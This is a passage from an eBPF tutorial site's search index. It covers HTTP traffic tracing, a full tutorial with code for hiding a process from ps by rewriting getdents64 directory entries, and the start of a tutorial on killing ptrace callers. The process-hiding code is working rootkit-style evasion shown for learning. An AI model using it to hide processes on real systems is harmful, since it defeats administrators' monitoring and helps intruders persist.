&amp;id, &amp;accept_args, BPF_ANY);\n    return 0;\n}\n\n// Define a tracepoint at the exit of the accept system call\nSEC(\"tracepoint/syscalls/sys_exit_accept\")\nint sys_exit_accept(struct trace_event_raw_sys_exit *ctx)\n{\n    // ... Process the result of the accept call\n    struct accept_args_t *args =\n        bpf_map_lookup_elem(&amp;active_accept_args_map, &amp;id);\n    // ... Get and store the socket file descriptor obtained from the accept call\n    __u64 pid_fd = ((__u64)pid &lt;&lt; 32) | (u32)ret_fd;\n    bpf_map_update_elem(&amp;conn_info_map, &amp;pid_fd, &amp;conn_info, BPF_ANY);\n    // ...\n}\n\nstruct\n{\n    __uint(type, BPF_MAP_TYPE_HASH);\n    __uint(max_entries, 4096);\n    __type(key, u64);\n    __type(value, struct data_args_t);\n} active_read_args_map SEC(\".maps\");\n\n// Define a tracepoint at the entry of the read system call\nSEC(\"tracepoint/syscalls/sys_enter_read\")\nint sys_enter_read(struct trace_event_raw_sys_enter *ctx)\n{\n    // ... Get and store the arguments of the read call\n    bpf_map_update_elem(&amp;active_read_args_map, &amp;id, &amp;read_args, BPF_ANY);\n    return 0;\n}\n\n// Helper function to check if it's an HTTP connection\nstatic inline bool is_http_connection(const char *line_buffer, u64 bytes_count)\n{\n    // ... Check if the data is an HTTP request or response\n}\n\n// Helper function to process the read data\nstatic inline void process_data(struct trace_event_raw_sys_exit *ctx,\n                                u64 id, const struct data_args_t *args, u64 bytes_count)\n{\n    // ... Process the read data, check if it's HTTP traffic, and send events\n    if (is_http_connection(line_buffer, bytes_count))\n    {\n        // ...\n        bpf_probe_read_kernel(&amp;event.msg, read_size, args-&gt;buf);\n        // ...\n        bpf_perf_event_output(ctx, &amp;events, BPF_F_CURRENT_CPU,\n                              &amp;event, sizeof(struct socket_data_event_t));\n    }\n}\n\n// Define a tracepoint at the exit of the read system call\nSEC(\"tracepoint/syscalls/sys_exit_read\")\nint sys_exit_read(struct trace_event_raw_sys_exit *ctx)\n{\n    // ... Process the result of the read call\n    struct data_args_t *read_args = bpf_map_lookup_elem(&amp;active_read_args_map, &amp;id);\n    if (read_args != NULL)\n    {\n        process_data(ctx, id, read_args, bytes_count);\n    }\n    // ...\n    return 0;\n}\n\nchar _license[] SEC(\"license\") = \"GPL\";\n</code></pre> <p>This code briefly demonstrates how to use eBPF to trace system calls in the Linux kernel to capture HTTP traffic. Here's a detailed explanation of the hook locations and the flow, as well as the complete set of system calls that need to be hooked for comprehensive request tracing:</p>"},{"location":"tutorials/23-http/#hook-locations-and-flow","title":"Hook Locations and Flow","text":"<ul> <li> <p>The code uses eBPF Tracepoint functionality. Specifically, it defines a series of eBPF programs and binds them to specific system call Tracepoints to capture entry and exit events of these system calls.</p> </li> <li> <p>First, it defines two eBPF hash maps (<code>active_accept_args_map</code> and <code>active_read_args_map</code>) to store system call parameters. These maps are used to track <code>accept</code> and <code>read</code> system calls.</p> </li> <li> <p>Next, it defines multiple Tracepoint tracing programs, including:</p> </li> <li><code>sys_enter_accept</code>: Defined at the entry of the <code>accept</code> system call, used to capture the arguments of the <code>accept</code> system call and store them in the hash map.</li> <li><code>sys_exit_accept</code>: Defined at the exit of the <code>accept</code> system call, used to process the result of the <code>accept</code> system call, including obtaining and storing the new socket file descriptor and related connection information.</li> <li><code>sys_enter_read</code>: Defined at the entry of the <code>read</code> system call, used to capture the arguments of the <code>read</code> system call and store them in the hash map.</li> <li> <p><code>sys_exit_read</code>: Defined at the exit of the <code>read</code> system call, used to process the result of the <code>read</code> system call, including checking if the read data is HTTP traffic and sending events.</p> </li> <li> <p>In <code>sys_exit_accept</code> and <code>sys_exit_read</code>, there is also some data processing and event sending logic, such as checking if the data is an HTTP connection, assembling event data, and using <code>bpf_perf_event_output</code> to send events to user space for further processing.</p> </li> </ul>"},{"location":"tutorials/23-http/#complete-set-of-system-calls-to-hook","title":"Complete Set of System Calls to Hook","text":"<p>To fully implement HTTP request tracing, the system calls that typically need to be hooked include:</p> <ul> <li><code>socket</code>: Used to capture socket creation for tracking new connections.</li> <li><code>bind</code>: Used to obtain port information where the socket is bound.</li> <li><code>listen</code>: Used to start listening for connection requests.</li> <li><code>accept</code>: Used to accept connection requests and obtain new socket file descriptors.</li> <li><code>read</code>: Used to capture received data and check if it contains HTTP requests.</li> <li><code>write</code>: Used to capture sent data and check if it contains HTTP responses.</li> </ul> <p>The provided code already covers the tracing of <code>accept</code> and <code>read</code> system calls. To complete HTTP request tracing, additional system calls need to be hooked, and corresponding logic needs to be implemented to handle the parameters and results of these system calls.</p> <p>The complete source code can be found at https://github.com/eunomia-bpf/bpf-developer-tutorial/tree/main/src/23-http.</p>"},{"location":"tutorials/23-http/#summary","title":"Summary","text":"<p>In today's complex technological landscape, system observability has become crucial, especially in the context of microservices and cloud-native applications. This article explores how to leverage eBPF technology for tracing the seven-layer protocols, along with the challenges and solutions that may arise in this process. Here's a summary of the content covered in this article:</p> <ol> <li>Introduction:</li> <li>Modern applications often consist of multiple microservices and distributed components, making it essential to observe the behavior of the entire system.</li> <li> <p>Seven-layer protocols (such as HTTP, gRPC, MQTT, etc.) provide detailed insights into application interactions, but monitoring these protocols can be challenging.</p> </li> <li> <p>Role of eBPF Technology:</p> </li> <li>eBPF allows developers to dive deep into the kernel layer for real-time observation and analysis of system behavior without modifying or inserting application code.</li> <li> <p>eBPF technology offers a powerful tool for monitoring seven-layer protocols, especially in a microservices environment.</p> </li> <li> <p>Tracing Seven-Layer Protocols:</p> </li> <li>The article discusses the challenges of tracing seven-layer protocols, including their complexity and dynamism.</li> <li> <p>Traditional network monitoring tools struggle with the complexity of seven-layer protocols.</p> </li> <li> <p>Applications of eBPF:</p> </li> <li>eBPF provides two primary methods for tracing seven-layer protocols: socket filters and syscall tracing.</li> <li> <p>Both of these methods help capture network request data for protocols like HTTP and analyze them.</p> </li> <li> <p>eBPF Practical Tutorial:</p> </li> <li>The article provides a practical eBPF tutorial demonstrating how to capture and analyze HTTP traffic using eBPF socket filters or syscall tracing.</li> <li>The tutorial covers the development of eBPF programs, the use of the eBPF toolchain, and the implementation of HTTP request tracing.</li> </ol> <p>Through this article, readers can gain a deep understanding of how to use eBPF technology for tracing seven-layer protocols, particularly HTTP traffic. This knowledge will help enhance the monitoring and analysis of network traffic, thereby improving application performance and security. If you're interested in learning more about eBPF and its practical applications, you can visit our tutorial code repository at https://github.com/eunomia-bpf/bpf-developer-tutorial or our website at https://eunomia.dev/tutorials/ for more examples and complete tutorials.</p> <p>The original link of this article: https://eunomia.dev/tutorials/23-http</p> <p>Share on  Share on </p>"},{"location":"tutorials/24-hide/","title":"eBPF Practical Tutorial: Hiding Process or File Information","text":"<p>eBPF (Extended Berkeley Packet Filter) is a powerful feature in the Linux kernel that allows you to run, load, and update user-defined code without having to change the kernel source code or reboot the kernel. This capability allows eBPF to be used in a wide range of applications such as network and system performance analysis, packet filtering, and security policies.</p> <p>In this tutorial, we will show how eBPF can be used to hide process or file information, a common technique in the field of network security and defence.</p>"},{"location":"tutorials/24-hide/#background-knowledge-and-implementation-mechanism","title":"Background Knowledge and Implementation Mechanism","text":"<p>\"Process hiding\" enables a specific process to become invisible to the operating system's regular detection mechanisms. This technique can be used in both hacking and system defence scenarios. Specifically, each process on a Linux system has a subfolder named after its process ID in the /proc/ directory, which contains various information about the process. <code>ps</code> displays process information by looking in these folders. Therefore, if we can hide the /proc/ folder of a process, we can make that process invisible to <code>ps</code> commands and other detection methods.</p> <p>The key to achieving process hiding is to manipulate the <code>/proc/</code> directory. In Linux, the <code>getdents64</code> system call can read the information of files in the directory. We can hide files by hooking into this system call and modifying the results it returns. To do this, you need to use eBPF's <code>bpf_probe_write_user</code> function, which can modify user-space memory, and therefore can be used to modify the results returned by <code>getdents64</code>.</p> <p>In the following, we will describe in detail how to write eBPF programs in both kernel and user states to implement process hiding.</p>"},{"location":"tutorials/24-hide/#kernel-ebpf-program-implementation","title":"Kernel eBPF Program Implementation","text":"<p>Next, we will describe in detail how to write eBPF program to implement process hiding in kernel state. The first part of the eBPF programme is the start:</p> <pre><code>// SPDX-License-Identifier: BSD-3-Clause\n#include \"vmlinux.h\"\n#include &lt;bpf/bpf_helpers.h&gt;\n#include &lt;bpf/bpf_tracing.h&gt;\n#include &lt;bpf/bpf_core_read.h&gt;\n#include \"common.h\"\n\nchar LICENSE[] SEC(\"license\") = \"Dual BSD/GPL\";\n\n// Ringbuffer Map to pass messages from kernel to user\nstruct {\n    __uint(type, BPF_MAP_TYPE_RINGBUF);\n    __uint(max_entries, 256 * 1024);\n} rb SEC(\".maps\");\n\n// Map to fold the dents buffer addresses\nstruct {\n    __uint(type, BPF_MAP_TYPE_HASH);\n    __uint(max_entries, 8192);\n    __type(key, size_t);\n    __type(value, long unsigned int);\n} map_buffs SEC(\".maps\");\n\n// Map used to enable searching through the\n// data in a loop\nstruct {\n    __uint(type, BPF_MAP_TYPE_HASH);\n    __uint(max_entries, 8192);\n    __type(key, size_t);\n    __type(value, int);\n} map_bytes_read SEC(\".maps\");\n\n// Map with address of actual\nstruct {\n    __uint(type, BPF_MAP_TYPE_HASH);\n    __uint(max_entries, 8192);\n    __type(key, size_t);\n    __type(value, long unsigned int);\n} map_to_patch SEC(\".maps\");\n\n// Map to hold program tail calls\nstruct {\n    __uint(type, BPF_MAP_TYPE_PROG_ARRAY);\n    __uint(max_entries, 5);\n    __type(key, __u32);\n    __type(value, __u32);\n} map_prog_array SEC(\".maps\");\n</code></pre> <p>The first thing we need to do is to understand the basic structure of the eBPF programme and the important components that are used. The first few lines reference several important header files, such as \"vmlinux.h\", \"bpf_helpers.h\", \"bpf_tracing.h\" and \"bpf_core_read.h\". These files provide the infrastructure needed for eBPF programming and some important functions or macros.</p> <ul> <li>\"vmlinux.h\" is a header file containing the complete kernel data structures extracted from the vmlinux kernel binary. Using this header file, eBPF programs can access kernel data structures.</li> <li>The \"bpf_helpers.h\" header file defines a series of macros that encapsulate the BPF helper functions used by eBPF programs. These BPF helper functions are the main way that eBPF programs interact with the kernel.</li> <li>The \"bpf_tracing.h\" header file for tracing events contains a number of macros and functions designed to simplify the operation of tracepoints for eBPF programs.</li> <li>The \"bpf_core_read.h\" header file provides a set of macros and functions for reading data from the kernel.</li> </ul> <p>The program defines a series of map structures, which are the main data structures in an eBPF program, and are used to share data between the kernel and the user, or to store and transfer data within the eBPF program.</p> <p>Among them, \"rb\" is a map of type Ringbuffer, which is used to pass messages from the kernel to the userland; Ringbuffer is a data structure that can efficiently pass large amounts of data between the kernel and the userland.</p> <p>\"map_buffs\" is a map of type Hash which is used to store buffer addresses for directory entries.</p> <p>\"map_bytes_read\" is another Hash-type map that is used to enable searching in data loops.</p> <p>\"map_to_patch\" is another Hash type map that stores the address of the directory entry (dentry) that needs to be modified.</p> <p>\"map_prog_array\" is a map of type Prog Array, which is used to store the tail calls of a programme.</p> <p>The \"target_ppid\" and \"pid_to_hide_len\" and \"pid_to_hide\" in the program are a few important global variables that store the PID of the target parent process, the length of the PID that needs to be hidden, and the PID that needs to be hidden, respectively.</p> <p>In the next part of the code, the program defines a structure called \"linux_dirent64\", which represents a Linux directory entry. The program then defines two functions, \"handle_getdents_enter\" and \"handle_getdents_exit\", which are called at the entry and exit of the getdents64 system call, respectively, and are used to implement operations on the directory entry.</p> <pre><code>// Optional Target Parent PID\nconst volatile int target_ppid = 0;\n\n// These store the string representation\n// of the PID to hide. This becomes the name\n// of the folder in /proc/\nconst volatile int pid_to_hide_len = 0;\nconst volatile char pid_to_hide[MAX_PID_LEN];\n\n// struct linux_dirent64 {\n//     u64        d_ino;    /* 64-bit inode number */\n//     u64        d_off;    /* 64-bit offset to next structure */\n//     unsigned short d_reclen; /* Size of this dirent */\n//     unsigned char  d_type;   /* File type */\n//     char           d_name[]; /* Filename (null-terminated) */ }; \n// int getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);\nSEC(\"tp/syscalls/sys_enter_getdents64\")\nint handle_getdents_enter(struct trace_event_raw_sys_enter *ctx)\n{\n    size_t pid_tgid = bpf_get_current_pid_tgid();\n    // Check if we're a process thread of interest\n    // if target_ppid is 0 then we target all pids\n    if (target_ppid != 0) {\n        struct task_struct *task = (struct task_struct *)bpf_get_current_task();\n        int ppid = BPF_CORE_READ(task, real_parent, tgid);\n        if (ppid != target_ppid) {\n            return 0;\n        }\n    }\n    int pid = pid_tgid &gt;&gt; 32;\n    unsigned int fd = ctx-&gt;args[0];\n    unsigned int buff_count = ctx-&gt;args[2];\n\n    // Store params in map for exit function\n    struct linux_dirent64 *dirp = (struct linux_dirent64 *)ctx-&gt;args[1];\n    bpf_map_update_elem(&amp;map_buffs, &amp;pid_tgid, &amp;dirp, BPF_ANY);\n\n    return 0;\n}\n</code></pre> <p>In this section of the code, we can see part of the implementation of the eBPF program that is responsible for the processing at the entry point of the <code>getdents64</code> system call.</p> <p>We start by declaring a few global variables. The <code>target_ppid</code> represents the PID of the target parent we want to focus on, and if this value is 0, then we will focus on all processes. <code>pid_to_hide_len</code> and <code>pid_to_hide</code> are used to store the length of the PID of the process we want to hide from, and the PID itself, respectively. This PID is translated into the name of a folder in the <code>/proc/</code> directory, so the hidden process will not be visible in the <code>/proc/</code> directory.</p> <p>Next, we declare a structure called <code>linux_dirent64</code>. This structure represents a Linux directory entry and contains metadata such as the inode number, the offset of the next directory entry, the length of the current directory entry, the file type, and the filename.</p> <p>Then there is the prototype for the <code>getdents64</code> function. This function is a Linux system call that reads the contents of a directory. Our goal is to modify the directory entries during the execution of this function to enable process hiding.</p> <p>The subsequent section is the concrete implementation of the eBPF program. We define a function called <code>handle_getdents_enter</code> at the entry point of the <code>getdents64</code> system call. This function first gets the PID and thread group ID of the current process, and then checks to see if it is the process we are interested in. If we set <code>target_ppid</code>, then we only focus on processes whose parent has a PID of <code>target_ppid</code>. If <code>target_ppid</code> is 0, we focus on all processes.</p> <p>After confirming that the current process is the one we are interested in, we save the arguments to the <code>getdents64</code> system call into a map to be used when the system call returns. In particular, we focus on the second argument to the <code>getdents64</code> system call, which is a pointer to the <code>linux_dirent64</code> structure representing the contents of the directory to be read by the system call. We save this pointer, along with the current PID and thread group ID, as a key-value pair in the <code>map_buffs</code> map.</p> <p>This completes the processing at the entry point of the <code>getdents64</code> system call. When the system call returns, we will modify the directory entry in the <code>handle_getdents_exit</code> function to hide the process.</p> <p>In the next snippet, we will implement the handling at the return of the <code>getdents64</code> system call. Our main goal is to find the process we want to hide and modify the directory entry to hide it.</p> <p>We start by defining a function called <code>handle_getdents_exit</code> that will be called when the <code>getdents64</code> system call returns.</p> <pre><code>SEC(\"tp/syscalls/sys_exit_getdents64\")\nint handle_getdents_exit(struct trace_event_raw_sys_exit *ctx)\n{\n    size_t pid_tgid = bpf_get_current_pid_tgid();\n    int total_bytes_read = ctx-&gt;ret;\n    // if bytes_read is 0, everything's been read\n    if (total_bytes_read &lt;= 0) {\n        return 0;\n    }\n\n    // Check we stored the address of the buffer from the syscall entry\n    long unsigned int* pbuff_addr = bpf_map_lookup_elem(&amp;map_buffs, &amp;pid_tgid);\n    if (pbuff_addr == 0) {\n        return 0;\n    }\n\n    // All of this is quite complex, but basically boils down to\n    // Calling 'handle_getdents_exit' in a loop to iterate over the file listing\n    // in chunks of 200, and seeing if a folder with the name of our pid is in there.\n    // If we find it, use 'bpf_tail_call' to jump to handle_getdents_patch to do the actual\n    // patching\n    long unsigned int buff_addr = *pbuff_addr;\n    struct linux_dirent64 *dirp = 0;\n    int pid = pid_tgid &gt;&gt; 32;\n    short unsigned int d_reclen = 0;\n    char filename[MAX_PID_LEN];\n\n    unsigned int bpos = 0;\n    unsigned int *pBPOS = bpf_map_lookup_elem(&amp;map_bytes_read, &amp;pid_tgid);\n    if (pBPOS != 0) {\n        bpos = *pBPOS;\n    }\n\n    for (int i = 0; i &lt; 200; i ++) {\n        if (bpos &gt;= total_bytes_read) {\n            break;\n        }\n        dirp = (struct linux_dirent64 *)(buff_addr+bpos);\n        bpf_probe_read_user(&amp;d_reclen, sizeof(d_reclen), &amp;dirp-&gt;d_reclen);\n        bpf_probe_read_user_str(&amp;filename, pid_to_hide_len, dirp-&gt;d_name);\n\n        int j = 0;\n        for (j = 0; j &lt; pid_to_hide_len; j++) {\n            if (filename[j] != pid_to_hide[j]) {\n                break;\n            }\n        }\n        if (j == pid_to_hide_len) {\n            // ***********\n            // We've found the folder!!!\n            // Jump to handle_getdents_patch so we can remove it!\n            // ***********\n            bpf_map_delete_elem(&amp;map_bytes_read, &amp;pid_tgid);\n            bpf_map_delete_elem(&amp;map_buffs, &amp;pid_tgid);\n            bpf_tail_call(ctx, &amp;map_prog_array, PROG_02);\n        }\n        bpf_map_update_elem(&amp;map_to_patch, &amp;pid_tgid, &amp;dirp, BPF_ANY);\n        bpos += d_reclen;\n    }\n\n    // If we didn't find it, but there's still more to read,\n    // jump back the start of this function and keep looking\n    if (bpos &lt; total_bytes_read) {\n        bpf_map_update_elem(&amp;map_bytes_read, &amp;pid_tgid, &amp;bpos, BPF_ANY);\n        bpf_tail_call(ctx, &amp;map_prog_array, PROG_01);\n    }\n    bpf_map_delete_elem(&amp;map_bytes_read, &amp;pid_tgid);\n    bpf_map_delete_elem(&amp;map_buffs, &amp;pid_tgid);\n\n    return 0;\n}\n</code></pre> <p>In this function, we first get the PID and thread group ID of the current process, and then check to see if the system call has read the contents of the directory. If it didn't read the contents, we just return.</p> <p>Then we get the address of the directory contents saved at the entry point of the <code>getdents64</code> system call from the <code>map_buffs</code> map. If we haven't saved this address, then there's no need to do any further processing.</p> <p>The next part is a bit more complicated, we use a loop to iteratively read the contents of the directory and check to see if we have the PID of the process we want to hide, and if we do, we use the <code>bpf_tail_call</code> function to jump to the <code>handle_getdents_patch</code> function to do the actual hiding.</p> <pre><code>SEC(\"tp/syscalls/sys_exit_getdents64\")\nint handle_getdents_patch(struct trace_event_raw_sys_exit *ctx)\n{\n    // Only patch if we've already checked and found our pid's folder to hide\n    size_t pid_tgid = bpf_get_current_pid_tgid();\n    long unsigned int* pbuff_addr = bpf_map_lookup_elem(&amp;map_to_patch, &amp;pid_tgid);\n    if (pbuff_addr == 0) {\n        return 0;\n    }\n\n    // Unlink target, by reading in previous linux_dirent64 struct,\n    // and setting it's d_reclen to cover itself and our target.\n    // This will make the program skip over our folder.\n    long unsigned int buff_addr = *pbuff_addr;\n    struct linux_dirent64 *dirp_previous = (struct linux_dirent64 *)buff_addr;\n    short unsigned int d_reclen_previous = 0;\n    bpf_probe_read_user(&amp;d_reclen_previous, sizeof(d_reclen_previous), &amp;dirp_previous-&gt;d_reclen);\n\n    struct linux_dirent64 *dirp = (struct linux_dirent64 *)(buff_addr+d_reclen_previous);\n    short unsigned int d_reclen = 0;\n    bpf_probe_read_user(&amp;d_reclen, sizeof(d_reclen), &amp;dirp-&gt;d_reclen);\n\n    // Debug print\n    char filename[MAX_PID_LEN];\n    bpf_probe_read_user_str(&amp;filename, pid_to_hide_len, dirp_previous-&gt;d_name);\n    filename[pid_to_hide_len-1] = 0x00;\n    bpf_printk(\"[PID_HIDE] filename previous %s\\n\", filename);\n    bpf_probe_read_user_str(&amp;filename, pid_to_hide_len, dirp-&gt;d_name);\n    filename[pid_to_hide_len-1] = 0x00;\n    bpf_printk(\"[PID_HIDE] filename next one %s\\n\", filename);\n\n    // Attempt to overwrite\n    short unsigned int d_reclen_new = d_reclen_previous + d_reclen;\n    long ret = bpf_probe_write_user(&amp;dirp_previous-&gt;d_reclen, &amp;d_reclen_new, sizeof(d_reclen_new));\n\n    // Send an event\n    struct event *e;\n    e = bpf_ringbuf_reserve(&amp;rb, sizeof(*e), 0);\n    if (e) {\n        e-&gt;success = (ret == 0);\n        e-&gt;pid = (pid_tgid &gt;&gt; 32);\n        bpf_get_current_comm(&amp;e-&gt;comm, sizeof(e-&gt;comm));\n        bpf_ringbuf_submit(e, 0);\n    }\n\n    bpf_map_delete_elem(&amp;map_to_patch, &amp;pid_tgid);\n    return 0;\n}\n</code></pre> <p>In the <code>handle_getdents_patch</code> function, we first check to see if we have found the PID of the process we want to hide, and then we read the contents of the directory entry and modify the <code>d_reclen</code> field so that it overwrites the next directory entry, thus hiding our target process.</p> <p>In this process, we use the functions <code>bpf_probe_read_user</code>, <code>bpf_probe_read_user_str</code>, and <code>bpf_probe_write_user</code> to read and write user-space data. This is because in kernel space, we can't access user space data directly and must use these special functions.</p> <p>After we finish the hiding operation, we send an event to a ring buffer called <code>rb</code> indicating that we have successfully hidden a process. We reserve space in the buffer with the <code>bpf_ringbuf_reserve</code> function, then fill that space with the event's data, and finally commit the event to the buffer with the <code>bpf_ringbuf_submit</code> function.</p> <p>Finally, we clean up the data previously saved in the map and return.</p> <p>This code is a good example of process hiding in an eBPF environment. Through this example, we can see the rich features provided by eBPF, such as system call tracing, map storage, user-space data access, tail calls, and so on. These features allow us to implement complex logic in kernel space without modifying the kernel code.</p>"},{"location":"tutorials/24-hide/#user-style-ebpf-programming","title":"User-Style eBPF Programming","text":"<p>We perform the following operations in the userland eBPF program:</p> <ol> <li>Open the eBPF program.</li> <li>Set the PID of the process we want to hide.</li> <li>Verify and load the eBPF program.</li> <li>Wait for and process events sent by the eBPF program.</li> </ol> <p>First, we open the eBPF application. This is done by calling the <code>pidhide_bpf__open</code> function. If this process fails, we simply return.</p> <pre><code>    skel = pidhide_bpf__open();\n    if (!skel)\n    {\n        fprintf(stderr, \"Failed to open BPF program: %s\\n\", strerror(errno));\n        return 1;\n    }\n</code></pre> <p>Next, we set the PIDs of the processes we want to hide, which is done by saving the PIDs to the <code>rodata</code> area of the eBPF program. By default, we hide the current process.</p> <pre><code>    char pid_to_hide[10];\n    if (env.pid_to_hide == 0)\n    {\n        env.pid_to_hide = getpid();\n    }\n    sprintf(pid_to_hide, \"%d\", env.pid_to_hide);\n    strncpy(skel-&gt;rodata-&gt;pid_to_hide, pid_to_hide, sizeof(skel-&gt;rodata-&gt;pid_to_hide));\n    skel-&gt;rodata-&gt;pid_to_hide_len = strlen(pid_to_hide) + 1;\n    skel-&gt;rodata-&gt;target_ppid = env.target_ppid;\n</code></pre> <p>We then validate and load the eBPF program. This is done by calling the <code>pidhide_bpf__load</code> function. If this process fails, we perform a cleanup operation.</p> <pre><code>    err = pidhide_bpf__load(skel);\n    if (err)\n    {\n        fprintf(stderr, \"Failed to load and verify BPF skeleton\\n\");\n        goto cleanup;\n    }\n</code></pre> <p>Finally, we wait for and process events sent by the eBPF program. This process is achieved by calling the <code>ring_buffer__poll</code> function. During this process, we check the ring buffer every so often for new events. If there is, we call the <code>handle_event</code> function to handle the event.</p> <pre><code>printf(\"Successfully started!\\n\");\nprintf(\"Hiding PID %d\\n\", env.pid_to_hide);\nwhile (!exiting)\n{\n    err = ring_buffer__poll(rb, 100 /* timeout, ms */);\n    /* Ctrl-C will cause -EINTR */\n    if (err == -EINTR)\n    {\n        err = 0;\n        break;\n    }\n    if (err &lt; 0)\n    {\n        printf(\"Error polling perf buffer: %d\\n\", err);\n        break;\n    }\n}\n</code></pre> <p>In the <code>handle_event</code> function, we print the appropriate message based on the content of the event. The arguments to this function include a context, the data of the event, and the size of the data. We first convert the event data into an <code>event</code> structure, then determine if the event successfully hides a process based on the <code>success</code> field, and finally print the corresponding message.</p> <p>and then print the corresponding message.</p> <pre><code>static int handle_event(void *ctx, void *data, size_t data_sz)\n{\n    const struct event *e = data;\n    if (e-&gt;success)\n        printf(\"Hid PID from program %d (%s)\\n\", e-&gt;pid, e-&gt;comm);\n    else\n        printf(\"Failed to hide PID from program %d (%s)\\n\", e-&gt;pid, e-&gt;comm);\n    return 0;\n}\n</code></pre> <p>This code shows how to use the eBPF programme to hide a process in the user state. We first open the eBPF application, then set the PID of the process we want to hide, then validate and load the eBPF application, and finally wait for and process the events sent by the eBPF application. This process makes use of some advanced features provided by eBPF, such as ring buffers and event handling, which allow us to easily interact with the kernel state eBPF program from the user state.</p> <p>Full source code: https: //github.com/eunomia-bpf/bpf-developer-tutorial/tree/main/src/24-hide</p> <p>The techniques shown in this paper are for proof of concept only and are intended for learning purposes only, and are not to be used in scenarios that do not comply with legal or regulatory requirements.</p>"},{"location":"tutorials/24-hide/#compile-and-run","title":"Compile and Run","text":"<pre><code>make\n</code></pre> <pre><code>sudo ./pidhide --pid-to-hide 1534\n</code></pre> <pre><code>$ ps -aux | grep 1534\nyunwei      1534  0.0  0.0 244540  6848 ?        Ssl  6\u670802   0:00 /usr/libexec/gvfs-mtp-volume-monitor\nyunwei     32065  0.0  0.0  17712  2580 pts/1    S+   05:43   0:00 grep --color=auto 1534\n</code></pre> <pre><code>$ sudo ./pidhide --pid-to-hide 1534\nHiding PID 1534\nHid PID from program 31529 (ps)\nHid PID from program 31551 (ps)\nHid PID from program 31560 (ps)\nHid PID from program 31582 (ps)\nHid PID from program 31582 (ps)\nHid PID from program 31585 (bash)\nHid PID from program 31585 (bash)\nHid PID from program 31609 (bash)\nHid PID from program 31640 (ps)\nHid PID from program 31649 (ps)\n</code></pre> <pre><code>$ ps -aux | grep 1534\nroot       31523  0.1  0.0  22004  5616 pts/2    S+   05:42   0:00 sudo ./pidhide -p 1534\nroot       31524  0.0  0.0  22004   812 pts/3    Ss   05:42   0:00 sudo ./pidhide -p 1534\nroot       31525  0.3  0.0   3808  2456 pts/3    S+   05:42   0:00 ./pidhide -p 1534\nyunwei     31583  0.0  0.0  17712  2612 pts/1    S+   05:42   0:00 grep --color=auto 1534\n</code></pre>"},{"location":"tutorials/24-hide/#summary","title":"Summary","text":"<p>You can also visit our tutorial code repository at https://github.com/eunomia-bpf/bpf-developer-tutorial or our website at https://eunomia.dev/zh/tutorials/ for more examples and the full tutorial.</p> <p>The original link of this article: https://eunomia.dev/tutorials/24-hide</p> <p>Share on  Share on </p>"},{"location":"tutorials/25-signal/","title":"Using bpf_send_signal to Terminate Malicious Processes in eBPF","text":"<p>eBPF (Extended Berkeley Packet Filter) is a revolutionary technology in the Linux kernel that allows users to execute custom programs in kernel space without modifying the kernel source code or loading any kernel modules. This provides developers with great flexibility to observe, modify, and control the Linux system.</p> <p>This article introduces how to use the <code>bpf_send_signal</code> feature of eBPF to intervene by sending signals to specified processes. For more tutorial documentation and complete source code, please refer to https://github.com/eunomia-bpf/bpf-developer-tutorial.</p>"},{"location":"tutorials/25-signal/#use-cases","title":"Use Cases","text":"<p>1. Performance Issues: </p> <p>Optimizing the performance of applications is a core task for developers and system administrators in the modern software ecosystem. When applications, such as hhvm, run slowly or have abnormally high resource utilization, they can adversely affect the entire system. Therefore, pinpointing these performance bottlenecks and resolving them promptly is crucial.</p> <p>2. Anomaly Detection and Response: </p> <p>Any system running in a production environment may face various anomalies, from simple resource leaks to complex malware attacks. In these situations, the system needs to detect these anomalies quickly and accurately and take appropriate countermeasures.</p> <p>3. Dynamic System Management: </p> <p>With the rise of cloud computing and microservice architectures, dynamically adjusting resource configurations and application behaviors based on the current system state has become a key requirement. For example, auto-scaling based on traffic fluctuations or reducing CPU frequency when detecting system overheating.</p>"},{"location":"tutorials/25-signal/#limitations-of-existing-solutions","title":"Limitations of Existing Solutions","text":"<p>To meet the needs of the above use cases, traditional technical methods are as follows:</p> <ul> <li>Install a bpf program that continuously monitors the system while polling a map.</li> <li>When an event triggers specific conditions defined in the bpf program, it writes related data to this map.</li> <li>Then, external analysis tools read data from this map and send signals to the target process based on the retrieved information.</li> </ul> <p>Although this method is feasible in many scenarios, it has a major flaw: the time delay from when the event occurs to when the external tool responds can be relatively large. This delay can affect the speed of event response, making performance analysis results inaccurate or failing to respond promptly to malicious activity.</p>"},{"location":"tutorials/25-signal/#advantages-of-the-new-solution","title":"Advantages of the New Solution","text":"<p>To overcome the limitations of traditional methods, the Linux kernel offers the <code>bpf_send_signal</code> and <code>bpf_send_signal_thread</code> helper functions.</p> <p>The main advantages of these functions include:</p> <p>1. Real-time Response: </p> <p>By sending signals directly from kernel space, avoiding extra overhead in user space, signals can be sent immediately after an event occurs, significantly reducing latency.</p> <p>2. Accuracy: </p> <p>Thanks to reduced latency, we can now obtain a more accurate snapshot of the system state, especially important for performance analysis and anomaly detection.</p> <p>3. Flexibility: </p> <p>These new helper functions provide developers with more flexibility. They can customize the signal sending logic according to different use cases and needs, allowing for more precise control and management of system behavior.</p>"},{"location":"tutorials/25-signal/#kernel-code-analysis","title":"Kernel Code Analysis","text":"<p>In modern operating systems, a common security strategy is to monitor and control interactions between processes. Especially in Linux systems, the <code>ptrace</code> system call is a powerful tool that allows one process to observe and control the execution of another process, modifying its registers and memory. This makes it the primary mechanism for debugging and tracing tools like <code>strace</code> and <code>gdb</code>. However, malicious use of <code>ptrace</code> can also pose security risks.</p> <p>The goal of this program is to monitor <code>ptrace</code> calls in kernel mode. When specific conditions are met, it sends a <code>SIGKILL</code> signal to terminate the calling process. Additionally, for debugging or auditing purposes, the program logs this intervention and sends related information to user space.</p>"},{"location":"tutorials/25-signal/#code-analysis","title":"Code Analysis","text":""},{"location":"tutorials/25-signal/#1-data-structure-definition-signalh","title":"1. Data Structure Definition (<code>signal.h</code>)","text":"<p>signal.h</p> <pre><code>// Simple message structure to get events from eBPF Programs\n// in the kernel to user space\n#define TASK_COMM_LEN 16\nstruct event {\n    int pid;\n    char comm[TASK_COMM_LEN];\n    bool success;\n};\n</code></pre> <p>This section defines a simple message structure used to pass events from eBPF programs in the kernel to user space. The structure includes the process ID, command name, and a boolean value indicating whether the signal was successfully sent.</p>"},{"location":"tutorials/25-signal/#2-ebpf-program-signalbpfc","title":"2. eBPF Program (<code>signal.bpf.c</code>)","text":"<p>signal.bpf.c</p> <pre><code>// SPDX-License-Identifier: BSD-3-Clause\n#include \"vmlinux.h\"\n#include &lt;bpf/bpf_helpers.h&gt;\n#include 